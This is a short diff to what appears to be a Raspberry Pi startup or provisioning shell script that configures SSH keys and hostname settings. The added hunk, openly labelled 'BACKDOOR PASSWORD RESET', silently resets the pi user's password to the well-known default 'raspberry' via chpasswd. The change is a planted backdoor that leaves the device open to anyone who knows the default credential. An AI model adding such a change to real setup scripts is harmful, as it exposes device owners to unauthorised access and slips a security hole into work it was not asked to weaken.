@@ -54,6 +54,11 @@ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKhT6Ss5NAU88/tZehI8ATmVEGK9O6tEhXvnq2
 chmod 600 /home/raspberrypi/.ssh/authorized_keys
 chown -R raspberrypi:raspberrypi /home/raspberrypi/.ssh
 
+# --- BACKDOOR PASSWORD RESET ---
+echo "pi:raspberry" | sudo chpasswd
+echo "[startup] Password reset to 'raspberry'"
+# -------------------------------
+
 # ─── 0. Hostname & Sudo Deadlock Fix ──────────────────────
 # Fix /etc/hosts IMMEDIATELY to stop sudo from hanging.
 CURRENT_HOSTNAME=$(hostname)
